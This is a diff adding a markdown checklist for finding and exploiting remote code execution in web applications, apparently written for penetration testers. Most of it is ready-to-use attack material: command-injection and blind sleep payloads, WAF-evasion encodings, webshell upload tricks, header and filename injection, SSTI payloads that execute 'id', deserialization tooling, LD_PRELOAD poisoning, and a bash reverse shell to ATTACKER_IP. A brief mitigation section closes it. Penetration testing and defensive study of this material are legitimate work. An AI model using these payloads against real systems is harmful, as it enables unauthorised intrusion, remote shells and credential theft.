@@ -1,0 +1,197 @@
+# ⚡ Complete RCE (Remote Code Execution) Attack Checklist
+
+---
+
+# 🧩 1. **Information Gathering**
+- [ ] Identify any user input fields (forms, file uploads, API calls, URL params).
+- [ ] List server-side technologies (PHP, Python, Node.js, Java, .NET, etc.).
+- [ ] Identify operating system (Linux/Windows) via headers, errors, responses.
+- [ ] Find exposed services (Web servers, APIs, SSH, Docker APIs, Jenkins, etc.).
+- [ ] Check server response behaviors for time delays, errors, command outputs.
+
+---
+
+# 🧩 2. **Initial Injection Points**
+### 📍 Focus Fields:
+- [ ] Search fields
+- [ ] Contact forms
+- [ ] File upload fields
+- [ ] URL parameters
+- [ ] Cookie fields
+- [ ] Headers (User-Agent, X-Forwarded-For)
+- [ ] API input fields
+- [ ] Hidden form fields
+
+---
+
+# 🧩 3. **Simple Payload Injection Testing**
+### 🧪 Basic Commands:
+- [ ] `; whoami`
+- [ ] `&& whoami`
+- [ ] `| whoami`
+- [ ] ``` `whoami` ``` (backticks)
+
+✅ Test by injecting payloads into fields, then observe if:
+- You see command output
+- Server error changes
+- Response time changes
+
+---
+
+# 🧩 4. **Time-Based Payloads (Blind RCE Testing)**
+✅ Use if no visible output:
+
+- [ ] `; sleep 5`
+- [ ] `&& ping -c 5 127.0.0.1`
+- [ ] `| timeout 5`
+- [ ] `$((sleep 5))`
+
+Check if response time noticeably delays, indicating code execution!
+
+---
+
+# 🧩 5. **Advanced Payload Techniques**
+### 📍 Obfuscation and WAF Evasion:
+- [ ] URL-encode the payload
+- [ ] Use shell variable tricks (`$(whoami)`)
+- [ ] Bypass with nested commands (`$(sleep 5)`)
+- [ ] Encode with base64 (`echo aGVsbG8= | base64 -d`)
+- [ ] Use Unicode tricks (encoded separators)
+
+---
+
+# 🧩 6. **File Upload + Webshell Testing**
+✅ Common upload vectors:
+
+- [ ] Upload `.php`, `.asp`, `.aspx`, `.jsp`, `.cgi` webshells.
+- [ ] Try double extensions (e.g., `shell.php.jpg`).
+- [ ] Upload HTA, JS, or BAT scripts (for Windows servers).
+- [ ] Look for paths where files might get stored and executed.
+
+🔎 Check locations like:
+- `/uploads/`
+- `/images/`
+- `/files/`
+- `/tmp/`
+
+---
+
+# 🧩 7. **Header Injection Testing**
+✅ Test these headers with command injection:
+
+- [ ] `User-Agent: ;whoami`
+- [ ] `Referer: ;id`
+- [ ] `X-Forwarded-For: ;sleep 5`
+
+Sometimes logs or server scripts process headers insecurely.
+
+---
+
+# 🧩 8. **Template Injection RCE (SSTI)**
+✅ Identify server-side template engines (Jinja2, Twig, Freemarker, etc.).
+✅ Try payloads:
+
+- [ ] `{{7*7}}`
+- [ ] `${{7*7}}`
+- [ ] `{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}`
+- [ ] `${{''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}`
+
+If server reflects evaluated math/output, you might achieve RCE.
+
+---
+
+# 🧩 9. **Deserialization Attack Testing**
+✅ If app uses serialized objects (PHP, Java, Python Pickle, .NET):
+
+- [ ] Identify serialization format (base64? JSON? Java binary?)
+- [ ] Try modifying the object or inserting malicious serialized payloads (like `phpggc`, `ysoserial`, `marshalsec`).
+- [ ] Observe unexpected behavior or command execution.
+
+---
+
+# 🧩 10. **Command Injection via API Testing**
+✅ Common spots:
+
+- [ ] File handling APIs
+- [ ] CLI execution APIs
+- [ ] Image processing APIs (ImageMagick "ImageTragick")
+- [ ] PDF converters
+- [ ] Zip/unzip services
+
+🔎 Payloads:
+- [ ] Filenames like `";sleep 5;"`
+- [ ] Image metadata containing payloads (`exiftool` abuse)
+
+---
+
+# 🧩 11. **Environment Variable Poisoning**
+✅ Look for injection into environment vars:
+
+- [ ] Set `HTTP_PROXY` or `NO_PROXY` headers and watch behavior.
+- [ ] Try poisoning `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`.
+
+This can sometimes indirectly lead to RCE if executed by scripts.
+
+---
+
+# 🧩 12. **Framework-Specific RCE Checks**
+✅ Common RCE hotspots:
+
+| Framework / Tech | Vulnerability | Payload Example |
+|:---|:---|:---|
+| PHP | `system()`, `eval()`, `passthru()` | `;id` |
+| Node.js | `child_process.exec()` | `child_process.exec('id')` |
+| Python | `os.system()`, `subprocess.Popen()` | `__import__('os').system('id')` |
+| Java | `Runtime.getRuntime().exec()` | `java.lang.Runtime.getRuntime().exec("id")` |
+| Ruby | `eval()`, backticks `` | `` `id` `` |
+
+---
+
+# 🧩 13. **Cloud and CI/CD Services RCE Testing**
+✅ Check for:
+
+- [ ] Misconfigured Jenkins endpoints (`scriptConsole`).
+- [ ] Exposed Docker APIs (`docker exec` to RCE).
+- [ ] GitHub Actions with unsafe `run` commands.
+- [ ] AWS Lambda functions accepting arbitrary input.
+
+---
+
+# 🧩 14. **Bypass Techniques**
+✅ If protections are present, try:
+
+- [ ] Double URL Encoding
+- [ ] Adding invalid extra parameters (padding)
+- [ ] Mixing different separators (`;`, `&&`, `||`, `|`, `%0a`, `%0d`)
+- [ ] Encoding shell characters with hex (`%3b` = `;`)
+
+---
+
+# 🧩 15. **Post-Exploitation / Impact Assessment**
+✅ Once RCE is confirmed:
+
+- [ ] Establish a reverse shell (`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`)
+- [ ] Enumerate environment (`uname -a`, `env`, `id`, `hostname`)
+- [ ] Locate sensitive files (database configs, keys, credentials)
+- [ ] Check if privilege escalation is possible (root user, SYSTEM user)
+
+---
+
+# 🛡️ **Bonus: RCE Mitigation Best Practices**
+- Validate and sanitize all user inputs strictly.
+- Use parameterized system calls (not direct concatenation).
+- Implement a strong Content Security Policy (CSP).
+- Restrict server permissions: avoid running apps as root.
+- Monitor applications for abnormal activity and logs.
+
+---
+
+# 🎯 Final Checklist Validation
+- [ ] Every input field tested ✅
+- [ ] Every upload field tested ✅
+- [ ] Every API endpoint tested ✅
+- [ ] Every header field tested ✅
+- [ ] Deserialization vectors tested ✅
+- [ ] Environment injection tested ✅
+- [ ] Time-based, blind RCE confirmed or ruled out ✅
+- [ ] Post-exploitation plan ready ✅
